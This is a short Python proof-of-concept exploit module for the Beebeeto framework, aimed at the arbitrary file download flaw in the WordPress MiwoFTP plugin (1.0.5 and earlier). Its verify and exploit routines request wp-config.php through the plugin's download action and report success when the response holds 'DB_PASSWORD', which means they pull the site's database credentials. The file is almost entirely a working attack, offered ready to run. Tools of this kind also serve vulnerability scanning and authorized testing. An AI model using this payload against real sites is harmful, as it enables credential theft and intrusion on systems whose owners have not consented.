#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {  
          # poc相关信息  
          'poc': {  
              'id': 'poc-2015-0096',
              'name': 'WordPress MiwoFTP <=1.0.5 任意文件下载漏洞 POC',
              'author': 'range',
              'create_date': '2015-05-05',
          },  
          # 协议相关信息  
          'protocol': {  
              'name': 'http',
              'port': [80],
              'layer4_protocol': ['tcp'],
          },  
          # 漏洞相关信息  
          'vul': {  
              'app_name': 'Wordpress',
              'vul_version': ['<=1.0.5',], 
              'type': 'Arbitrary File Download',
              'tag': ['Wordpress MiwoFTP插件漏洞', 'php'],
              'desc': '''
                      WordPress MiwoFTP Plugin <= 1.0.5 - Arbitrary File Download
                      ''',
              'references': ['https://www.exploit-db.com/exploits/36801/', 
              ],  
          },  
    }

    @classmethod
    def verify(cls, args):
        payload = ('/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download'
                   '&item=wp-config.php&order=name&srt=yes')
        verify_url = args['options']['target'] + payload
        request = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        response = urllib2.urlopen(request)
        reg = re.compile("DB_PASSWORD")
        if reg.findall(response.read()):
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify
    
if __name__ == '__main__':
    from pprint import pprint
    
    mp = MyPoc()
    pprint(mp.run())